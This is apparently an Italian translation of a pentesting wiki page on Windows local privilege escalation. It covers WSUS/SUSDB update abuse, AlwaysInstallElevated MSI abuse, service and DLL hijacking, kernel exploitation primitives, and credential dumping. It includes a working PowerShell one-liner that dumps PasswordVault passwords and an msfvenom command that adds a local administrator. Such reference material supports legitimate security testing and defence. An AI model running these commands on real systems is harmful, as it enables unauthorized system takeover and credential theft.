...
Questa pagina raccoglie la metodologia generale per la privilege escalation su Windows, basata su diverse guide fondamentali.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Il relativo flusso pratico di enumerazione si basa anche su workshop e checklist della community.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Il materiale storico sugli attacchi include la presentazione di DerbyCon sulla privilege escalation in Windows.<sup>[[5]](#references)</sup>
...
### Protezione degli amministratori / silent elevation tramite UIAccess

I processi UIAccess avviati tramite `RAiLaunchAdminProcess` possono essere abusati per raggiungere un High IL senza prompt quando i controlli secure-path di AppInfo vengono aggirati. Consulta qui il workflow dedicato per il bypass di UIAccess/Admin Protection:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

La propagazione nel registry dell'accessibilità del Secure Desktop può essere abusata per ottenere una scrittura arbitraria nel registry come SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Le build recenti di Windows hanno inoltre introdotto un percorso di LPE tramite **SMB arbitrary-port**, in cui un'autenticazione NTLM locale privilegiata viene riflessa tramite una connessione TCP SMB riutilizzata:
...
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas integra watson)_
...
Puoi scoprire come abilitarla su [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
...
I dettagli delle esecuzioni della pipeline PowerShell vengono registrati, includendo i comandi eseguiti, le invocazioni dei comandi e parti degli script. Tuttavia, i dettagli completi dell'esecuzione e i risultati dell'output potrebbero non essere acquisiti.
...
Viene acquisito un registro completo dell'attività e dell'intero contenuto dello script durante l'esecuzione, garantendo che ogni blocco di codice venga documentato mentre viene eseguito. Questo processo conserva una traccia di audit completa di ogni attività, utile per la forensics e per l'analisi dei comportamenti malevoli. Documentando tutte le attività al momento dell'esecuzione, vengono forniti dettagli approfonditi sul processo.
```bash
...
```
Gli eventi di logging per lo Script Block possono essere individuati nel Visualizzatore eventi di Windows al percorso: **Registri applicazioni e servizi > Microsoft > Windows > PowerShell > Operational**.\
...
Allora, **è sfruttabile.** Se l'ultimo registro è uguale a 0, la voce WSUS verrà ignorata.

Per sfruttare queste vulnerabilità puoi usare strumenti come: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Si tratta di script exploit MiTM weaponized per iniettare aggiornamenti "fake" nel traffico WSUS non-SSL.
...
### Abuso degli aggiornamenti custom di SUSDB: payload unsigned tramite `.txt`/`.esd`

Questo è un trust-boundary failure diverso dall'intercettazione di una connessione HTTP WSUS: il prerequisito consiste nell'avere accesso sufficiente alle **stored procedure del database WSUS (`SUSDB`)** per pubblicare e approvare un aggiornamento custom. Un possibile punto di ingresso pratico consiste nel fare relay dell'account computer WSUS upstream verso un server MSSQL separato che ospita `SUSDB`; il prerequisito esatto dipende dalla deployment, quindi occorre prima enumerare i permessi `EXECUTE` invece di presumere di avere diritti di amministratore SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Per il percorso di attacco separato che esegue il relay dell'autenticazione dei client WSUS da HTTP/8530 verso LDAP, SMB o AD CS, consulta [Abuso di WSUS HTTP per il relay NTLM](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Creazione, targeting e approvazione dell'aggiornamento

Il workflow degli aggiornamenti custom utilizza procedure WSUS legittime come API di pubblicazione soggetta a restrizioni. Le transizioni di stato importanti sono:<sup>[[38]](#references)</sup>

| Fase | Stored procedure rilevanti |
| --- | --- |
| Importazione dei metadati dell'aggiornamento | `spImportUpdate` |
| Memorizzazione dei frammenti XML dei prerequisiti, localizzati ed estesi | `spSaveXMLFragment` |
| Associazione del digest del contenuto all'URL controllato dall'attacker | `spSetBatchURL` |
...
Il file name, i digest, la size e l'handler `CommandLineInstallation` devono corrispondere nei metadati/frammenti importati. Dopo aver assegnato il content URL e il target group, l'approvazione finale è simile alla seguente; usa identificatori nuovi per update, group e deployment invece di riutilizzare i GUID di esempio.<sup>[[38]](#references)[[39]](#references)</sup>
```sql
EXEC spDeployUpdate
...
WSUS normalmente rifiuta contenuti eseguibili arbitrari non firmati. Tuttavia, in `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, il percorso .NET `VerifyFile` imposta su false il flag del controllo del certificato quando il nome file fornito termina con `.txt` o `.esd`; `CheckCertificateSignature` viene quindi ignorato senza verificare prima che i byte siano testo o un'immagine ESD legittima. Di conseguenza, un PE invariato denominato, ad esempio, `payload.exe.txt` può superare la verifica del contenuto e in seguito essere avviato dal gestore di installazione a riga di comando dell'update. Si tratta di un bug di policy/type-confusion, non di una falsificazione della firma.<sup>[[39]](#references)</sup>
```csharp
...
Il PoC di ricerca [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) genera l'SQL necessario per la catena import/fragment/URL/group/deployment, include un client MSSQL modificato per eseguirlo e fornisce `BitsWebServer.py` per lo staging del contenuto. Un'invocazione minima in un laboratorio autorizzato è:<sup>[[40]](#references)</sup>
```bash
...
```
#### Esecuzione automatica e persistenza tramite retry

L'interazione lato client dipende dai criteri. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opzione `4 - Auto download and schedule install`, fa sì che un aggiornamento approvato venga scaricato e installato secondo la pianificazione configurata, senza che l'utente debba selezionarlo manualmente. Durante i test, un payload il cui aggiornamento rimaneva non riuscito/incompleto veniva nuovamente proposto immediatamente dopo l'uscita del processo di callback; il comportamento di retry può quindi diventare una persistenza tramite esecuzione ricorrente, ma è rumoroso perché il client espone uno stato di aggiornamento non riuscito.<sup>[[39]](#references)</sup>

#### Pivot per il rilevamento e l'hardening

Utili pivot lato server e lato client derivanti da questa catena sono:<sup>[[39]](#references)</sup>

- Eseguire l'audit dell'esecuzione in `SUSDB` di `spCreateTargetGroup`, `spSetBatchURL` e `spDeployUpdate`; analizzare i nuovi gruppi di targeting, le origini dei contenuti esterni, i payload di aggiornamento `.txt`/`.esd` e le distribuzioni eseguite da principal inattesi (soprattutto account non computer).
- Esaminare `C:\Program Files\Update Services\LogFiles` alla ricerca di `ContentSyncAgent`, `FileVerified`, `FileVerficationFailed` (con errore ortografico) ed `EventId=364`; correlare la verifica con l'estensione del payload e il magic del contenuto, anziché affidarsi al suffisso.
- Cercare installazioni di Windows Update che falliscono/riprovano ripetutamente e l'esecuzione di PE o attività figlie/di rete inattese provenienti da contenuti con nomi `.txt` o `.esd`.
- Richiedere Extended Protection for Authentication sul servizio database ove supportato e limitare l'accesso di rete al database al server WSUS e ai sistemi amministrativi autorizzati. Ridurre al minimo ed eseguire l'audit dei diritti `EXECUTE` sulle procedure di aggiornamento personalizzate.

## Third-Party Auto-Updaters e Agent IPC (local privesc)

Molti agent enterprise espongono una superficie IPC su localhost e un canale di aggiornamento privilegiato. Se il processo di enrollment può essere indotto a connettersi a un server dell'attacker e l'updater si fida di una rogue root CA o di controlli deboli sul signer, un utente locale può fornire un MSI malevolo che il servizio SYSTEM installa. Vedere qui una tecnica generalizzata (basata sulla catena Netskope stAgentSvc – CVE-2025-0309):
...
**Se** questi 2 valori del Registro di sistema sono **abilitati** (il valore è **0x1**), gli utenti con qualsiasi livello di privilegio possono **installare** (eseguire) file `*.msi` come NT AUTHORITY\\**SYSTEM**.
```bash
...
Usa il comando `Write-UserAddMSI` di power-up per creare, all'interno della directory corrente, un file binario MSI di Windows per eseguire un privilege escalation. Questo script scrive un installer MSI precompilato che richiede l'aggiunta di un utente/gruppo (quindi sarà necessario l'accesso GIU):
```
Write-UserAddMSI
```
Esegui semplicemente il binary creato per effettuare la privilege escalation.

### MSI Wrapper

Leggi questo tutorial per scoprire come creare un MSI wrapper usando questi tool. Nota che puoi eseguire il wrapping di un file "**.bat**" se vuoi **solo** **eseguire** **righe di comando**
...
A partire da **Windows 8.1**, Microsoft ha introdotto una protezione avanzata per la Local Security Authority (LSA) per **bloccare** i tentativi da parte di processi non attendibili di **leggere la sua memoria** o iniettare codice, proteggendo ulteriormente il sistema.\
...
[**Maggiori informazioni sulle credenziali memorizzate qui**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
...
Dovresti verificare se uno dei gruppi di cui fai parte dispone di permessi interessanti
```bash
# CMD
...
Innanzitutto, elencando i processi **controlla la presenza di password nella riga di comando del processo**.\
Controlla se puoi **sovrascrivere qualche binary in esecuzione** o se disponi dei permessi di scrittura sulla cartella del binary per sfruttare possibili [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
...
```
Controlla sempre la presenza di possibili [**electron/cef/chromium debuggers** in esecuzione: potresti abusarne per aumentare i privilegi](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).
...
```
### Password mining della memoria

Puoi creare un dump della memoria di un processo in esecuzione utilizzando **procdump** di Sysinternals. Servizi come FTP hanno le **credenziali in chiaro nella memoria**; prova a fare il dump della memoria e a leggere le credenziali.
```bash
...
Se un servizio viene eseguito come **`LocalSystem`**, **`LocalService`**, **`NetworkService`** o con un account di dominio privilegiato, ma **gli utenti con privilegi bassi possono modificare l'EXE del servizio o la relativa cartella padre**, spesso è possibile effettuare l'hijacking del servizio **sostituendo il binario e riavviando il servizio**.

**Verifica se puoi modificare il binario eseguito da un servizio** o se disponi di **autorizzazioni di scrittura sulla cartella** in cui si trova il binario ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
...
3. Sostituisci il binario del servizio con un payload o con un service binary malevolo valido.
...
```
> Se il servizio non consente a un utente normale di riavviarlo, verifica se si avvia automaticamente all'avvio, se dispone di un'azione in caso di errore che lo rilancia o se può essere attivato indirettamente dall'applicazione che lo utilizza.
...
```
È necessario verificare se **Authenticated Users** o **NT AUTHORITY\INTERACTIVE** possiedono autorizzazioni `FullControl`. In tal caso, il binary eseguito dal servizio può essere modificato.
...
Alcune funzionalità di Accessibilità di Windows creano chiavi **ATConfig** per utente, che in seguito vengono copiate da un processo **SYSTEM** in una chiave di sessione HKLM. Una race di **symbolic link** del registro può reindirizzare quella scrittura privilegiata verso **qualsiasi percorso HKLM**, fornendo una primitiva di **scrittura arbitraria di valori HKLM**.<sup>[[18]](#references)</sup>
...
net start msiserver
```
### Permessi AppendData/AddSubdirectory del registry dei servizi

Se disponi di questo permesso su un registry, significa che **puoi creare sotto-registry a partire da questo**. Nel caso dei Windows services, questo è **sufficiente per eseguire codice arbitrario:**
...
```
**Puoi rilevare e sfruttare** questa vulnerabilità con metasploit: `exploit/windows/local/trusted\_service\_path` Puoi creare manualmente un binary del servizio con metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Azioni di ripristino

Windows consente agli utenti di specificare le azioni da eseguire se un servizio ha esito negativo. Questa funzionalità può essere configurata per puntare a un binary. Se questo binary può essere sostituito, potrebbe essere possibile effettuare una privilege escalation. Ulteriori dettagli sono disponibili nella [documentazione ufficiale](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).
...
**Leggi** la **pagina seguente** per saperne di più sulle **posizioni interessanti degli autorun per l'escalation dei privilegi**:
...
driverquery /SI
```
Se un driver espone una primitiva arbitraria di lettura/scrittura del kernel (comune nei gestori IOCTL progettati male), puoi eseguire un'escalation sottraendo direttamente un token SYSTEM dalla memoria del kernel.<sup>[[13]](#references)</sup> Consulta la tecnica passo per passo qui:
...
#### UAF di cancel-safe queue, disclosure del paged-pool e pivot tramite I/O ring

Alcune catene Windows kernel LPE possono essere costruite a partire da due bug individualmente deboli: una **race condition sulla durata di una cancel-safe queue** che libera una richiesta/CBD mentre il lock della queue è ancora acquisito, e una disclosure **lock-release-before-copy** che fa leak di un'allocazione liberata del paged-pool durante `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Note di audit ed exploitation:

- **Free-under-lock + cancel afterwards**: cerca un percorso di successo che esegua **Acquire -> CompleteRequest/free -> Release**, mentre il percorso di annullamento esegue **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Se il percorso di successo raggiunge `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` prima di rilasciare il lock CBDQ/CSQ, un thread bloccato in `NtCancelIoFileEx -> IopCsqCancelRoutine` può riprendere in seguito e passare un `PFLT_CALLBACK_DATA` liberato alla callback di rimozione del driver.
- **Reclaim dell'oggetto della queue liberato** con un'allocazione del paged-pool delle stesse dimensioni e controllata dall'attaccante. Le `NPFS` Data Queue Entries sono utili perché payload e dimensione sono controllabili e in seguito puoi sondarle con operazioni di pipe read/peek. Se l'oggetto liberato incorpora link di lista, sovrascrivili con una **lista ciclica di nodi request falsi nella memoria user** in modo che il driver elabori ripetutamente strutture di richiesta definite dall'attaccante invece di terminare alla head originale della lista.
- **Trasforma una write prevedibile**: se la request falsa reindirizza un puntatore a un contesto annidato usato dalle write di bookkeeping (timestamp / QPC / campi adiacenti al refcount), potresti ottenere una write del kernel **controllata nell'indirizzo ma non nel valore**. In tal caso, come target usa il campo **length/size** di un oggetto del pool sottoposto a spray invece di un puntatore finale a codice/dati, quindi enumera lo spray finché l'oggetto corrotto non produce una **read out-of-bounds del paged-pool**.
- **Pattern di disclosure sfruttabile tramite race**: qualsiasi syscall che esegue `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` è un candidato valido. L'affidabilità migliora quando l'attaccante può aumentare il buffer copiato (ad esempio aggiungendo molte list/resource entries che incrementano la dimensione dell'allocazione finale di un serializer), perché una copia più lunga amplia la finestra di sostituzione senza necessariamente mandare in crash la macchina.
- **Target di refill ricchi di puntatori**: gli array di registered-buffer di Windows **I/O ring** sono eccellenti target di disclosure perché la loro dimensione nel paged-pool è controllata dall'attaccante (`8 * regBufferCnt`) e ogni elemento è un puntatore del kernel a un `_IOP_MC_BUFFER_ENTRY`. Fai leak di uno di questi array, recupera l'`IORING_OBJECT` circostante, quindi corrompi **`RegBuffers`** e **`RegBuffersCount`** in modo che le operazioni successive dell'I/O ring consumino entry forgiate dall'attaccante e forniscano read/write arbitrarie del kernel. Se l'unica write disponibile ti fornisce un byte stabile (ad esempio da `KUSER_SHARED_DATA+0x14`), usa **write overlapping non allineate** per costruire un puntatore user a byte ripetuti come `0x0101010101010101`, mappalo con `VirtualAlloc` e colloca lì l'array forged dei registered-buffer.<sup>[[30]](#references)</sup>
...
```
Una volta ottenuti primitive arbitrarie di lettura/scrittura del kernel dall’I/O ring corrotto, ruba un token SYSTEM usando il workflow post-primitive standard:
...
Le moderne vulnerabilità degli hive consentono di predisporre layout deterministici, abusare dei discendenti scrivibili di HKLM/HKU e convertire la corruzione dei metadati in overflow del paged pool del kernel senza un driver personalizzato. Impara l’intera catena qui:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Type confusion in direct-mode di `RtlQueryRegistryValues` da percorsi controllati dall’attaccante

Alcuni driver accettano un percorso del Registry da userland, verificano solo che sia una stringa UTF-16 valida e poi chiamano `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` con `RTL_QUERY_REGISTRY_DIRECT` verso uno scalar sullo stack, come `int readValue`. Se manca `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` viene interpretato in base al tipo **effettivo** del Registry, non al tipo previsto dallo sviluppatore.

Questo crea due primitive utili:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: un percorso assoluto `\Registry\...` controllato dall’utente consente al driver di interrogare chiavi scelte dall’attaccante, rivelare l’esistenza tramite codici di ritorno/log e, talvolta, leggere valori a cui il chiamante non potrebbe accedere direttamente.
- **Corruzione della memoria del kernel**: una destinazione scalar come `&readValue` viene interpretata erroneamente come `REG_QWORD`, `UNICODE_STRING` o buffer binario di dimensione variabile in base al tipo del valore del Registry.
...
- **Staging in un trusted hive**: usa NtObjectManager per enumerare i discendenti scrivibili di `\Registry\Machine` e riesegui la scansione con un token **low-integrity** duplicato per trovare le chiavi raggiungibili da contesti sandboxed:<sup>[[26]](#references)</sup>
```powershell
...
- **`REG_BINARY`**: per i dati binari di grandi dimensioni, la modalità direct interpreta il primo `LONG` in `EntryContext` come dimensione signed del buffer. Se una precedente lettura `REG_DWORD` lascia un valore **negativo** controllato dall’attaccante nello scalare riutilizzato, la query `REG_BINARY` successiva copia direttamente i byte dell’attaccante sopra gli slot adiacenti dello stack, spesso il percorso più semplice per la sovrascrittura completa di un callback pointer.

Pattern di hunting particolarmente efficace: **letture eterogenee del registro nella stessa variabile dello stack senza reinizializzarla**. Cerca `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, puntatori `EntryContext` riutilizzati e percorsi di codice in cui la prima lettura del registro controlla se viene eseguita una seconda lettura.
...
- Lettura/scrittura raw non vincolata del disco (tampering offline, tecniche di persistenza al boot).
- Terminare processi arbitrari, inclusi Protected Process/Light (PP/PPL), consentendo il kill di AV/EDR dalla user land tramite il kernel.
...
- Limita gli IOCTL (maschere di accesso, METHOD_*, convalida degli input) e valuta modelli brokerizzati invece di privilegi kernel diretti.
...
Se disponi di **permessi di scrittura all'interno di una cartella presente in PATH**, potresti riuscire a effettuare l'hijacking di una DLL caricata da un processo e **escalare i privilegi**.<sup>[[2]](#references)</sup>
...
Questa è una variante del **percorso di ricerca non controllato di Windows** che interessa le applicazioni **Node.js** ed **Electron** quando eseguono un import bare come `require("foo")` e il modulo previsto è **assente**.<sup>[[20]](#references)</sup>
...
Se un **utente con privilegi bassi** può creare `C:\node_modules`, può inserire un `foo.js` malevolo (o una cartella del package) e attendere che un processo **Node/Electron con privilegi superiori** risolva la dipendenza mancante. Il payload viene eseguito nel contesto di sicurezza del processo vittima, quindi si tratta di **LPE** ogni volta che il target viene eseguito come amministratore, da un'attività pianificata elevata/wrapper di servizio o da un'applicazione desktop privilegiata avviata automaticamente.
...
Pattern utili per il code review nei file `.asar` non impacchettati o nei sorgenti dell'applicazione:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
...
mkdir C:\node_modules
```
3. Inserisci un modulo con l'esatto nome previsto:
```javascript
// C:\node_modules\foo.js
...
Esempi reali di moduli opzionali mancanti che seguono questo schema includono `bluebird` e `utf-8-validate`, ma la **technique** è la parte riutilizzabile: trova qualsiasi **missing bare import** che un processo privilegiato Windows Node/Electron risolverà.
...
[**Controlla questa pagina per i comandi relativi al firewall**](../basic-cmd-for-pentesters.md#firewall) **(elencare regole, creare regole, disattivare, disattivare...)**
...
Se ottieni l'utente root, puoi metterti in ascolto su qualsiasi porta (la prima volta che usi `nc.exe` per metterti in ascolto su una porta, verrà chiesto tramite GUI se `nc` deve essere autorizzato dal firewall).
```bash
wsl whoami
...
Windows Vault memorizza le credenziali utente per server, siti web e altri programmi che **Windows** può utilizzare per **accedere automaticamente gli utenti**. Inizialmente, questo potrebbe sembrare indicare che gli utenti possano memorizzare le credenziali per siti come Facebook, Twitter o Gmail e fare in modo che i browser eseguano automaticamente l'accesso, ma non è così che funziona.

Windows Vault memorizza le credenziali con cui Windows può eseguire automaticamente l'accesso degli utenti, il che significa che qualsiasi **applicazione Windows che necessita di credenziali per accedere a una risorsa** (server o sito web) **può utilizzare questo Credential Manager** e Windows Vault, usando le credenziali fornite invece di richiedere continuamente agli utenti di inserire nome utente e password.
...
```
Quindi puoi usare `runas` con l'opzione `/savecred` per utilizzare le credenziali salvate. Il seguente esempio richiama un binary remoto tramite una condivisione SMB.
```bash
...
```
Si noti che è possibile utilizzare mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) oppure il modulo [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Le moderne applicazioni UWP di Windows, Microsoft Edge e i moderni servizi di sistema archiviano i token di autenticazione e le password in testo in chiaro all'interno di `PasswordVault` della Universal Windows Platform (UWP) (esposto anche come `Web Credentials` in `vaultcmd`). Questo spazio di archiviazione è isolato per sessione e può essere decrittografato nativamente senza diritti amministrativi o `SeDebugPrivilege`.

Eseguire questo comando PowerShell all'interno della sessione attiva dell'utente per eseguire immediatamente il dump e decrittografare tutti i nomi utente e le password in testo in chiaro archiviate:
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

La **Data Protection API (DPAPI)** fornisce un metodo per la cifratura simmetrica dei dati, utilizzato principalmente all'interno del sistema operativo Windows per la cifratura simmetrica delle chiavi private asimmetriche. Questa cifratura sfrutta un segreto dell'utente o del sistema per contribuire significativamente all'entropia.

**DPAPI consente la cifratura delle chiavi tramite una chiave simmetrica derivata dai segreti di accesso dell'utente**. Negli scenari che prevedono la cifratura del sistema, utilizza i segreti di autenticazione del dominio del sistema.
...
```
Puoi usare il **modulo mimikatz** `dpapi::masterkey` con gli argomenti appropriati (`/pvk` o `/rpc`) per decrittografarla.
...
```
Puoi usare il **mimikatz module** `dpapi::cred` con il `/masterkey` appropriato per effettuare la decrittazione.\
...
Le **credenziali PowerShell** vengono spesso utilizzate per attività di **scripting** e automazione, come metodo per archiviare comodamente credenziali crittografate. Le credenziali sono protette tramite **DPAPI**, il che in genere significa che possono essere decrittate solo dallo stesso utente e sullo stesso computer su cui sono state create.

Per **decrittare** delle credenziali PS dal file che le contiene, puoi eseguire:
```bash
...
```
Usa il modulo `dpapi::rdg` di **Mimikatz** con il `/masterkey` appropriato per **decriptare qualsiasi file .rdg**\
...
**Tieni presente che per recuperare le password da AppCmd.exe devi essere Administrator ed eseguire il programma con un livello di integrità High.**\
...
Le chiavi private SSH possono essere memorizzate nella chiave di registro `HKCU\Software\OpenSSH\Agent\Keys`, quindi dovresti verificare se contiene qualcosa di interessante:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Se trovi una voce all'interno di quel percorso, probabilmente si tratta di una chiave SSH salvata. È memorizzata crittografata, ma può essere facilmente decrittografata usando [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
...
Se il servizio `ssh-agent` non è in esecuzione e vuoi avviarlo automaticamente all'avvio, esegui:
```bash
...
All'interno dei CLSID di questo registro puoi trovare la sottochiave **InProcServer32**, che contiene un valore predefinito che punta a una **DLL** e un valore chiamato **ThreadingModel**, che può essere **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single o Multi) oppure **Neutral** (Thread Neutral).

![Cronologia dei browser - COM DLL Overwriting: all'interno dei CLSID di questo registro puoi trovare la sottochiave InProcServer32, che contiene un valore predefinito che punta a una DLL e un valore...](<../../images/image (729).png>)
...
```
**Cerca un file con un nome file specifico**
```bash
...
Quindi, se hai **accesso completo al processo con privilegi ridotti**, puoi recuperare l'**handle aperto al processo privilegiato creato** con `OpenProcess()` e **iniettare una shellcode**.\
...
[Leggi anche questo **altro post per una spiegazione più completa su come testare e abusare di ulteriori handle aperti di processi e thread ereditati con diversi livelli di autorizzazione (non solo accesso completo)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

I segmenti di memoria condivisa, chiamati **pipe**, consentono la comunicazione e il trasferimento di dati tra processi.

Windows fornisce una funzionalità chiamata **Named Pipes**, che consente a processi non correlati di condividere dati, anche attraverso reti diverse. Questo è simile a un'architettura client/server, con ruoli definiti come **named pipe server** e **named pipe client**.

Quando un **client** invia dati attraverso una pipe, il **server** che ha configurato la pipe può **assumere l'identità** del **client**, a condizione che disponga dei necessari diritti **SeImpersonate**. Individuare un **processo privilegiato** che comunica tramite una pipe che puoi imitare offre l'opportunità di **ottenere privilegi più elevati**, adottando l'identità di tale processo quando interagisce con la pipe da te creata. Per istruzioni su come eseguire un attacco di questo tipo, sono disponibili guide utili [**qui**](named-pipe-client-impersonation.md) e [**qui**](#from-high-integrity-to-system).

Inoltre, il seguente tool consente di **intercettare una comunicazione tramite named pipe con un tool come burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **e questo tool consente di elencare e visualizzare tutte le pipe per individuare privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)
...
- Ogni evento scrive l'`InitContext` controllato dall'attaccante, proveniente da `Initialize`, sull'handle. Registra un'applicazione line con `LRegisterRequestRecipient` (`Req_Func 61`), attiva `TRequestMakeCall` (`Req_Func 121`), recupera l'evento tramite `GetAsyncEvents` (`Req_Func 0`), quindi annulla la registrazione/chiude per ripetere scritture deterministiche.
...
Ciò consente di effettuare privilege escalation e bypassare UAC contemporaneamente sfruttando la stessa vulnerabilità. Inoltre, non è necessario installare nulla e il binario utilizzato durante il processo è firmato ed emesso da Microsoft.
...
Quindi **leggi questo per apprendere informazioni su UAC e UAC bypass:**
...
## Da eliminazione/spostamento/ridenominazione arbitrari di cartelle a SYSTEM EoP
...
- Step 3: Sincronizzazione custom
...
- Quindi **inviare nuovamente il segnale** affinché la disinstallazione possa terminare.
- Windows Installer non riesce a eliminare il `.rbf` e, poiché non riesce a eliminare tutti i contenuti, `C:\Config.Msi` **non viene rimossa**.
...
> A questo punto, **attivare la vulnerability di eliminazione arbitraria di cartelle a livello SYSTEM** per eliminare `C:\Config.Msi`.
...
- Sovrascrivere il file `.rbs` con un **fake rollback script** che ordina a Windows di:
...
- Eseguire un **auto-elevated binary** attendibile (ad esempio, `osk.exe`) che carica la DLL dirottata.
- **Boom**: il tuo codice viene eseguito **come SYSTEM**.


### Da eliminazione/spostamento/ridenominazione arbitrari di file a SYSTEM EoP

La tecnica principale di rollback MSI (quella precedente) presuppone che tu possa eliminare una **cartella intera** (ad esempio, `C:\Config.Msi`). Ma cosa succede se la tua vulnerability consente soltanto l'**eliminazione arbitraria di file**?

Potresti sfruttare gli **internals di NTFS**: ogni cartella dispone di un hidden alternate data stream chiamato:
```
...
### Dalla cancellazione del contenuto di una cartella a SYSTEM EoP
Cosa succede se la tua primitive non ti consente di eliminare file/cartelle arbitrari, ma **consente di eliminare il *contenuto* di una cartella controllata dall'attacker**?
...
- L'oplock **mette in pausa l'esecuzione** quando un processo con privilegi tenta di eliminare `file1.txt`.
```c
// pseudo-code
...
- Quando raggiunge `file1.txt`, l'**oplock si attiva** e trasferisce il controllo al tuo callback.

4. Step 4: All'interno del callback dell'oplock – reindirizza l'eliminazione
...
Sfrutta una primitiva che consente di **creare una cartella arbitraria come SYSTEM/admin** — anche se **non puoi scrivere file** o **impostare permessi deboli**.
...
- Se lo **si crea anticipatamente come cartella**, Windows non riesce a caricare il driver effettivo all'avvio.
...
- **Non esiste alcun fallback** né alcun metodo di ripristino senza un intervento esterno (ad esempio, la riparazione dell'avvio o l'accesso al disco).

### Dai percorsi privilegiati di log/backup + symlink OM all'overwrite arbitrario di file / DoS all'avvio

Quando un **servizio privilegiato** scrive log/export in un percorso letto da una **config scrivibile**, reindirizza quel percorso con **symlink di Object Manager + mount point NTFS** per trasformare la scrittura privilegiata in un overwrite arbitrario (anche **senza** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Requisiti**
- La config che memorizza il percorso di destinazione è scrivibile dall'attaccante (ad esempio, `%ProgramData%\...\.ini`).
- Possibilità di creare un mount point verso `\RPC Control` e un file symlink OM (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
...
4. Ispeziona il target sovrascritto (parser hex/PE) per confermare la corruzione; il riavvio forza Windows a caricare il percorso del driver manomesso → **boot loop DoS**. Questo si applica anche a qualsiasi file protetto che un servizio con privilegi aprirà in scrittura.
...
Da un processo con High Integrity puoi provare ad **abilitare le chiavi di registro AlwaysInstallElevated** e **installare** una reverse shell usando un wrapper _**.msi**_.\
[Ulteriori informazioni sulle chiavi di registro coinvolte e su come installare un pacchetto _.msi_ sono disponibili qui.](#alwaysinstallelevated)
...
Se disponi di questi token privileges (probabilmente li troverai in un processo con High Integrity), potrai **aprire quasi qualsiasi processo** (ad eccezione dei protected processes) con il SeDebug privilege, **copiare il token** del processo e creare un **processo arbitrario con quel token**.\
Usando questa tecnica, di solito si **seleziona un processo qualsiasi in esecuzione come SYSTEM con tutti i token privileges** (_sì, puoi trovare processi SYSTEM senza tutti i token privileges_).\
**Puoi trovare un** [**esempio di codice che esegue la tecnica proposta qui**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Questa tecnica viene usata da meterpreter per eseguire l'escalation in `getsystem`. La tecnica consiste nel **creare una pipe e poi creare/abusare di un service per scrivere su quella pipe**. Quindi, il **server** che ha creato la pipe usando il privilege **`SeImpersonate`** potrà **impersonare il token** del client della pipe (il service), ottenendo i privilegi SYSTEM.\
...
Se riesci a **effettuare il hijack di una dll** che viene **caricata** da un **processo** in esecuzione come **SYSTEM**, potrai eseguire codice arbitrario con quei permessi. Pertanto, il Dll Hijacking è utile anche per questo tipo di privilege escalation e, inoltre, è molto **più facile da ottenere da un processo con High Integrity**, poiché avrà **permessi di scrittura** sulle cartelle usate per caricare le dll.\
...
